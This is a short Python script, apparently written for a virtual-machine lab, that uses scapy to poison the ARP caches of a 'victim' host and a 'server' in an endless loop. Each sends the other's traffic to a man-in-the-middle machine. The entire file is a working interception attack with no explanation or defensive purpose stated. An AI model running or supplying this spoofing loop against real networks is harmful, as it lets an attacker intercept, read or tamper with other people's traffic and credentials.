#!/usr/bin/python3

import scapy.all as scapy
from time import sleep

server_ip = "192.168.56.12"
mitm_ip = "192.168.56.11"
victim_ip = "192.168.56.10"

server_mac = "08:00:27:07:f0:da"
mitm_mac = "08:00:27:e5:70:cd"
victim_mac = "08:00:27:90:ce:e9"

mitm_iface = "enp0s8"

while True:
    arp_spoof=scapy.ARP(psrc=server_ip, pdst=victim_ip, hwdst=victim_mac, op="is-at")
    scapy.send(arp_spoof)
    arp_spoof=scapy.ARP(psrc=victim_ip, pdst=server_ip, hwdst=server_mac, op="is-at")
    scapy.send(arp_spoof)
    sleep(15)
